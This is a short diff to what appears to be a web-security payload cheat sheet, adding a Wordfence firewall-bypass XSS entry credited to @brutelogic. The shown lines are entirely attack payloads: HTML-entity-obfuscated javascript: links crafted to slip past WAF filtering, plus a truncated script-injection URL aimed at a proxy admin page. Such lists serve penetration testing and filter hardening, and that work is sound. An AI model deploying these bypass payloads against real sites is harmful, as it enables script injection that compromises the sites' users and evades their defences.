@@ -2817,6 +2817,10 @@ https://host:2000/proxy.html?action=manage&main=log&show=deny_log&proxy=>"<scrip
 ```
 
 ### Wordfence
+- XSS Bypass by [@brutelogic](https://twitter.com/brutelogic)
+```
+<a href=javas&#99;ript:alert(1)>
+```
 - XSS Bypass - [Source](https://github.com/0xInfection/Awesome-WAF/blob/master/papers/Bypassing%20WAF%20XSS%20Detection%20Mechanisms.pdf)
 ```
 <a/href=javascript&colon;alert()>click
